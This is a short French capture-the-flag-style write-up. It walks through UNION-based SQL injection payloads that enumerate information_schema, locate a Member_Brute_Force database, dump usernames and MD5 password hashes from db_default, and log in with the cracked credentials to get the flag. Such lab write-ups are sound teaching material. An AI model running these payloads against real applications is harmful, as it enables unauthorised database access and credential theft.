1 union select table_name, column_name from information_schema.columns;

Avec cette injection SQL, on peut récupérer toutes les tables et leurs colonnes de toutes les base de données.

On remarque une table "db_default" qui a plusieurs colonnes intéressantes: id, username et password.

Pour retrouver où se situe cette table, on liste toutes les databases ainsi que leurs tables à l'aide de cette requête sql:

1 union select table_schema, table_name from information_schema.tables;

On repère une base de donnée nommée Member_Brute_Force qui contient la table db_default.
On peut ainsi accéder au username / password de cette table en utilisant la requête suivante:

1 union select username,password from Member_Brute_Force.db_default;

on trouve root / admin et leur mot de passe hashé en MD5.

On se connecte depuis la page de login avec les identifiants et le mot de passe décrypté pour avoir le flag.
